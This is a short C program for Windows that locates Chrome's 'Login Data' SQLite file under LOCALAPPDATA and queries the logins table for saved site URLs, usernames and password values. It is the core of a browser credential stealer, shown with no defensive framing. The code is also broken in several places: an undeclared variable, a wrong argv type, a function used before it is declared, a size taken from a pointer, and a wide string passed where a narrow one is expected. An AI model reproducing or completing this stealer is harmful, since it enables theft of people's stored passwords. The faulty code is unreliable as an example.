#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <winbase.h>
#include <fcntl.h>
#include <sqlite3.h>

int main(int argc, char *argv)
{

    sqlite3 *db;
    sqlite3_stmt *res;

    char *login_data_path = get_chrome_path();

    int retVal = sqlite3_open(login_data_path, &db);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

    retVal = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &res, 0);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Couldn't fetch data: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

        rc = sqlite3_step(res);
    
    if (rc == SQLITE_ROW) {
        printf("%s\n", sqlite3_column_text(res, 0));
    }
    
    sqlite3_finalize(res);
    sqlite3_close(db);
    
    return 0;
}

char *get_chrome_path()
{
    char *buff = malloc(256);

    char chromePath[] = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    if (!GetEnvironmentVariable(L"LOCALAPPDATA", buff, sizeof(buff)))
    {
        printf("[!] Failed to get environment variable: LOCALAPPDATA");
        exit(-1);
    }

    strncat(buff, chromePath, sizeof(chromePath));

    return buff;
}